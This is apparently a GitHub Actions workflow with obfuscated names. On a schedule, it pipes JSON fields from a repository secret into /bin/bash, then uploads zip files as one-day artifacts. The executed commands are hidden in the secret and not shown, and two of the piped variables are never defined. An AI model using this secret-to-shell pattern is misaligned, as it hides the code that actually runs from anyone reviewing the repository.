name: linzhongxiangwei
on:
  workflow_dispatch:

  schedule:
    - cron: '11 4,10,16,22 * * *'
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - name: linzhongxiangwei
        env:
          eau97036: ${{ secrets.eau97036 }}
        run: |
          printf '%s' "$eau97036" | jq -r .i831 | /bin/bash
          printf '%s' "$grvt141" | jq -r .gkmdv522 | /bin/bash
          printf '%s' "$ueak4219" | jq -r .mpxvy85 | /bin/bash

      - name: Upload artifact
        uses: actions/upload-artifact@v4
        with:
          name: L4fNC4dl
          path: "*.zip"
          retention-days: 1
